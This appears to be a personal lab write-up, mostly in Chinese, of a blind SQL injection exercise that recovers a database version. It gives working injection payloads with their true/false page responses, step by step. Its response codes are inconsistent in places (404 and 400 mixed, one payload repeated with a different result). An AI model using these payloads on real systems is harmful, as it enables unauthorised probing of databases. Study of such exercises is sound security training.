# SQL Injection (Blind)

### Objective: Find the version of the SQL database software through a blind SQL attack.

頁面顯示的資訊有限，只能靠回傳的值是 true or false 來推測你的 query 的正確性

```bash
# User ID exists in the database.
0' OR '1'='1
```

```bash
# User ID is MISSING from the database.
0' OR '1'='2
```

`‘1’=’2` 不成立，所以不管前面那段 (`0’ OR` ) 是什麼，你都可以靠後面這段來判斷你的猜測是否正確

因此在這邊確認可以靠後面的那段語法來判斷 true or false，接下來就是要拼出那段語法

## 各種嘗試和卡關
```sql
SELECT IF(STRCMP('test','test1'),'no','yes');
```

```sql
SELECT SUBSTRING((select @@version), 1, 5) AS ExtractString;
```
```sql
SELECT IF ((SELECT @@version) = '10.3.32-MariaDB-1:10.3.32+maria~focal', 'pass', 'failed');
```
...

## 卡關

在這邊卡關了，因為太執著於用 SELECT,IF, UNION 的語法，後來看了一下提示的頁面，發現被遮住的答案提示長度並不常，代表應該有更簡短的寫法，因此改變方向，試著思考更簡短的判斷方式，就是 A AND B 這種形式的語法

接著順便重新梳理一下資訊，從推測程式語法的階段開始推敲:

可以假設原本的 SQL 大概長這樣

```sql
SELECT * FROM users WHERE id=0;
```

用 SQL injection 把它變成 `A OR B` 的形式就可以判斷 true false 了

```sql
SELECT * FROM users WHERE id=0 OR (SELECT SUBSTRING((SELECT @@version),1,2) = '10');
```

所以根據之前的 query 結果，我們只要加上版本判斷

```sql
1' AND (SELECT SUBSTRING((SELECT @@version),1,2) = '10')
```

還有為了滿足 injection 的 single quote `1='1` 在結尾

```sql
1' AND (SELECT SUBSTRING((SELECT @@version),1,2) = '10') AND 1='1
```

### 驗證測試

這邊要故意輸入錯誤的版本，確認頁面回傳的結果是否為 false，代表我們使用的 injection 邏輯是正確的

```sql
1' AND (SELECT SUBSTRING((SELECT @@version),1,2) = 'xx10') AND 1='1
```

### 開始推測

接下來就是利用 `like` 來慢慢逼近或猜測，或用工具會比較方便

```sql
# 200
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.%') AND 1='1
```

```sql
# 200
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1%') AND 1='1
```

```sql
# 404
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.12%') AND 1='1
```

```sql
# 200
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.%') AND 1='1
```

```sql
# 200
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.2%') AND 1='1
```

```sql
# 400
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.2.%') AND 1='1
```

```sql
# 400
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.2%') AND 1='1
```

## Done
```
```sql
# 200
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.26%') AND 1='1
```
```
最後再測試版號是否已經結束

```sql
# 400
1' AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.26.%') AND 1='1
```

到目前為止可以看出 DB 的版本是 `10.1.26`

## 心得

- 卡關時可以試著將 SQL 簡化或替換成另一種寫法 (前提是方向正確的話)
- 建立一個測試用得 DB 方便測試 SQL 語法

## memo

### query dn version

```bash
select @@version;
```

```bash
select VERSION();
```

